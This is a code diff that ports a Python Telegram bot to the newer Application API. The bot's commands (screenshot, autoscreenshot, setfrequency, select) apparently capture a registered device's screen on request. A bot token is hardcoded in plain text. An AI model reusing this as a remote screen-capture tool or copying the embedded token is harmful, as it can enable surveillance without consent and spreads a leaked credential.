@@ -3,7 +3,7 @@ import time
 import platform
 import pyautogui
 from telegram import Update
-from telegram.ext import Updater, CommandHandler, CallbackContext
+from telegram.ext import Application, CommandHandler, CallbackContext
 
 # Global variables
 devices = {}
@@ -88,16 +88,14 @@ def stop(update: Update, context: CallbackContext):
 def main():
     TOKEN = "7576774302:AAFtHrzsAOmI58FM9kMgravElfXbOznwYzA"
     register_device(1)
-    updater = Updater(TOKEN)
-    dp = updater.dispatcher
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(CommandHandler("screenshot", screenshot))
-    dp.add_handler(CommandHandler("setfrequency", set_frequency))
-    dp.add_handler(CommandHandler("autoscreenshot", autoscreenshot))
-    dp.add_handler(CommandHandler("stop", stop))
-    dp.add_handler(CommandHandler("select", select))
-    updater.start_polling()
-    updater.idle()
+    application = Application.builder().token(TOKEN).build()  # Corrected line
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("screenshot", screenshot))
+    application.add_handler(CommandHandler("setfrequency", set_frequency))
+    application.add_handler(CommandHandler("autoscreenshot", autoscreenshot))
+    application.add_handler(CommandHandler("stop", stop))
+    application.add_handler(CommandHandler("select", select))
+    application.run_polling()
 
 if __name__ == "__main__":
     main()
